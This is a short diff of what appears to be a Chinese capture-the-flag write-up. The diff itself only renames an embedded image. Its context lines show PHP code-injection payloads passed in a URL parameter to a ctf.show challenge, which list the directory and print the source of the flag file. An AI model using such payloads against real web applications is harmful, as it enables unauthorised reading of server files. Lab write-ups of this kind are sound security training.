@@ -648,7 +648,7 @@ http://5a6291ec-129d-4e7f-b30b-7776441151ff.challenge.ctf.show/?c=print_r(scandi
 http://5a6291ec-129d-4e7f-b30b-7776441151ff.challenge.ctf.show/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
 ```
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 得到flag。
 
